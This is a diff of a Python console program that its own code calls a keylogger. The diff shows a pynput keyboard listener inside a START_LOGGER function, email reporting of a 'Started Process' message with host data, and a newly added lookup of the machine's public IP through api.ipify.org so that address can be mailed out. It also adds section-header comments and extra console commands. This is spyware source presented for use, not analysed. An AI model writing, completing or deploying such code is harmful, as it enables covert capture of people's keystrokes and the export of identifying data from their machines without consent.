@@ -3,11 +3,13 @@ import os
 import random
 import json
 
+#!# -----------------------------------CONSTANTS----------------------------------- #!#
+
 
 os.system("cls")
 
 
-commands_list = ["exit", "help", "compile", "config", "emails", "test", "mode"]
+commands_list = ["exit", "help", "compile", "config", "emails", "test", "mode", "test", "start"]
 modes = ["email", "local"]
 
 
@@ -44,8 +46,9 @@ keys = []
 keys_pressed = 0
 
 
+#!# -----------------------------------LICENSE----------------------------------- #!#
 
-    
+ 
     
 ## J S K V I B U
 # JS235-SDKO3-K5FJK2-VFK3KL-IFYH5-B45F8-UY348
@@ -119,6 +122,7 @@ except:
 
 JsonPath = f"{path}/config.json"
     
+#!# -----------------------------------CONFIG CODE----------------------------------- #!#
 
 
 class newConfig():
@@ -185,7 +189,7 @@ class newConfig():
 
             
      
-
+#!# -----------------------------------LOGGER----------------------------------- #!#
 
 def START_LOGGER():
     from pynput.keyboard import Key, Listener
@@ -195,11 +199,14 @@ def START_LOGGER():
         
     
 
-    def getIP():
-        hostname=socket.gethostname()   
-        IPAddr=socket.gethostbyname(hostname)   
-        return hostname, IPAddr
-
+    import requests
+ 
+    def get_ip_address():
+        url = 'https://api.ipify.org'
+        response = requests.get(url)
+        ip_address = response.text
+        hostname = socket.gethostname()
+        return hostname, ip_address
 
 
     with open(f"{JsonPath}","r") as file:
@@ -273,7 +280,7 @@ def START_LOGGER():
     def isMaillable():
         global SendMail
         try:
-            host_Data = getIP()
+            host_Data = get_ip_address()
             email(f"Started Process || {host_Data}")
             SendMail = True 
         except:
@@ -287,6 +294,7 @@ def START_LOGGER():
 
 
 
+#!# -----------------------------------CONTROL PANEL----------------------------------- #!#
 
 
 
@@ -347,14 +355,13 @@ def __main__():
             START_LOGGER()
         except:
             print("Something went wrong when loading the keylogger.")
-
-
-       
-
+            
     elif CONSOLE.lower() == "mode":
         os.system("cls")
         printlogo()
         print(newConfig.mode())
+        
+            
 
 
 
